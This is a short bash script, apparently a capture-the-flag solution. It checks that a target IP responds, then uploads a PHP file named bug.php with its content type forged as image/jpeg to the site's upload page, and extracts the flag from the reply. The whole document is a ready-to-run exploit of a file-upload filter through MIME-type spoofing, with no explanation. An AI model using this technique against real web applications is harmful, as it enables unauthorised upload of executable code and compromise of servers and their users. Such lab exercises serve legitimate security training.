#!/bin/bash

if [ "$#" -ne 1 ]; then
	echo "Usage: ./script.sh <ip>"
	exit 1
else
	ip=$1
fi

echo "Testing the IP address..."
response=$(curl -s -o /dev/null -w "%{http_code}" http://$ip)

if [ $response -eq 200 ]; then
	echo "The IP address responded successfully with HTTP status code 200."
	echo "Extracting the flag..."
	flag=$(curl -s -X POST -F "uploaded=@bug.php;type=image/jpeg" -F "Upload=Upload" "http://$ip/index.php?page=upload" |
		grep -oP '(?<=The flag is : ).*?(?=</h2>)')
	
	if [ -n "$flag" ]; then
		echo "The flag is: $flag"
	else
		echo "Failed to extract the flag."
	fi
else
	echo "Failed to connect. HTTP status code: $response"
fi
